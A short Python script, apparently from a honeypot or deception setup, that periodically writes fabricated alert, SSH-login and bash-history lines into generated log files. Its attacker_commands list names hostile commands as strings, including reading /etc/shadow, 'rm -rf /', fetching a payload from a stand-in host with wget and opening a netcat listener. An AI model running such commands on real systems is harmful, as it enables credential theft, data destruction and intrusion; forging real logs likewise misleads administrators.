#!/usr/bin/env python3
import time
import random
from datetime import datetime
from pathlib import Path

# Paths to files to update
auth_log = Path('generated_files/var/log/auth.log')
bash_history = Path('generated_files/home/sysadmin/.bash_history')
alert_log = Path('generated_files/var/log/alert.log')

# Simulated attacker actions to monitor
attacker_commands = [
    'sudo su', 'cat /etc/shadow', 'rm -rf /', 'wget http://malicious.site/payload.sh',
    'echo "hacked" > /tmp/hacked.txt', 'nc -lvp 4444', 'python3 -m http.server 8080',
    'useradd attacker', 'passwd attacker', 'chmod 777 /root'
]

# Simulate detection and adaptive response
def detect_attacker_action():
    # Randomly simulate detection of an attacker command
    cmd = random.choice(attacker_commands)
    now = datetime.now().strftime('%b %d %H:%M:%S')
    # Log the suspicious command
    with open(alert_log, 'a') as f:
        f.write(f"{now} debian ALERT: Suspicious command detected: {cmd}\n")
    # Update auth log to simulate sysadmin response
    response_entry = f"{now} debian sshd[12345]: Accepted password for sysadmin from 127.0.0.1 port {random.randint(1000,65000)} ssh2\n"
    with open(auth_log, 'a') as f:
        f.write(response_entry)
    # Update bash history to simulate sysadmin action
    sysadmin_cmds = [
        'pkill nc', 'pkill python3', 'userdel attacker', 'rm /tmp/hacked.txt',
        'chmod 700 /root', 'echo "Intrusion detected, taking action"'
    ]
    sysadmin_cmd = random.choice(sysadmin_cmds)
    with open(bash_history, 'a') as f:
        f.write(sysadmin_cmd + '\n')
    print(f"[ADAPTIVE] Detected and responded to suspicious activity: {cmd}")

def main():
    print("[ADAPTIVE] Starting adaptive response simulator...")
    while True:
        detect_attacker_action()
        time.sleep(random.randint(120, 300))  # Wait 2-5 minutes

if __name__ == "__main__":
    main()
